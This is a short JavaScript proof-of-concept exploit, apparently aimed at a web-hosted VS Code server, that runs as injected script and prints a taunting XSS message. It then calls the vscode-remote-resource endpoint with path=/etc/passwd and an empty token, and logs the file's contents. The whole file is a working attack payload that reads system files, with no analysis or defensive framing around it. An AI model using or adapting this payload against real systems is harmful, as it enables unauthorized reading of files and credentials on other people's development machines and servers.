console.dir("Shirley: Hey sudi, I love you , here is your XSS in " + origin)
globalThis.fetch = WorkerGlobalScope.prototype.fetch.bind(globalThis)

async function exploit() {
    const page_resp = await fetch("/stable-6c3eb9ae5f4d44be88307d2137e8364e0e36891a/vscode-remote-resource?path=/etc/passwd&tkn=")
    const text = await page_resp.text()
    console.dir(text)
    }
exploit()
